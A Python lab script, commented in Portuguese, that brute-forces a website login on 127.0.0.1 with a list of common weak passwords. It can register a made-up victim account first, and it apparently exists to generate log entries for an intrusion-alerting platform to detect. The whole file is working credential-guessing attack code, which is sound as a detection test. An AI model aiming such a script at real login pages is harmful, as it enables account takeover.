"""Ataque de forca bruta no login do site, SO em 127.0.0.1.

Tenta as senhas de uma lista, uma por uma, para o mesmo e-mail. Cada tentativa vira uma linha
no login.log; o agente entrega essas linhas e a plataforma alerta por IP
(5 falhas em 60 s = ATENCAO, 20 = CRITICO).

Com --criar-vitima, o script cadastra antes um usuario inventado cuja senha esta no fim da
lista, para a demonstracao terminar com a senha "descoberta".

Uso (no WSL, com os containers no ar):
    python testes/ataque_brute_force.py --criar-vitima
"""

from __future__ import annotations

import argparse
import secrets
import time

import requests

import alvo_local

LOGIN_PADRAO = "http://127.0.0.1:8080/receitas_pr%C3%A1ticas/login/login.php"

# Senhas fracas comuns (lista generica de laboratorio, nao vem de vazamento real).
LISTA = ["123456", "123456789", "12345678", "senha", "senha123", "password", "qwerty", "111111",
         "abc123", "1234567", "iloveyou", "admin", "admin123", "000000", "123123", "brasil",
         "flamengo", "corinthians", "palmeiras", "amor", "teste", "teste123", "mudar123", "welcome",
         "monkey", "letmein", "football", "princesa", "dragon", "sunshine"]


def atacar(url_login: str, email: str, lista: list[str], por_segundo: float = 5,
           mostrar: bool = True) -> dict:
    """Tenta cada senha; para na primeira que entra. Login certo = redireciona para suaconta.php."""
    alvo_local.garantir(url_login)
    for numero, senha in enumerate(lista, start=1):
        resposta = requests.post(url_login, data={"email": email, "senha": senha}, timeout=10,
                                 allow_redirects=False)
        entrou = resposta.status_code == 302 and "suaconta" in resposta.headers.get("Location", "")
        if mostrar:
            print(f"  tentativa {numero:3d}: {senha:12s} -> {'ENTROU' if entrou else 'falhou'}", flush=True)
        if entrou:
            return {"senha": senha, "tentativas": numero}
        if por_segundo > 0:
            time.sleep(1 / por_segundo)
    return {"senha": None, "tentativas": len(lista)}


def criar_vitima(url_login: str) -> str:
    """Cadastra um usuario inventado com uma senha da lista (a penultima) e devolve o e-mail."""
    email = f"vitima-{secrets.token_hex(3)}@lab.local"
    senha = LISTA[-2]
    url_cadastro = url_login.replace("/login/login.php", "/cadastro/cadastro.php")
    r = requests.post(url_cadastro, timeout=10, allow_redirects=False,
                      data={"firstname": "Vitima", "lastname": "Laboratorio", "email": email,
                            "number": "61900000000", "password": senha, "Confirmpassword": senha})
    if r.status_code != 302:
        raise SystemExit(f"nao consegui cadastrar a vitima (HTTP {r.status_code}): {r.text[:200]}")
    return email


def main() -> None:
    p = argparse.ArgumentParser(description="Forca bruta no login do site (so 127.0.0.1)")
    p.add_argument("--alvo", default=LOGIN_PADRAO)
    p.add_argument("--email", help="e-mail atacado (padrao: cria uma vitima com --criar-vitima)")
    p.add_argument("--criar-vitima", action="store_true")
    p.add_argument("--por-segundo", type=float, default=5, help="tentativas por segundo (0 = sem pausa)")
    args = p.parse_args()
    alvo_local.garantir(args.alvo)
    email = criar_vitima(args.alvo) if args.criar_vitima else args.email
    if not email:
        raise SystemExit("informe --email ou use --criar-vitima")
    print(f"Atacando o login de {email} com {len(LISTA)} senhas...")
    print(atacar(args.alvo, email, LISTA, args.por_segundo))


if __name__ == "__main__":
    main()
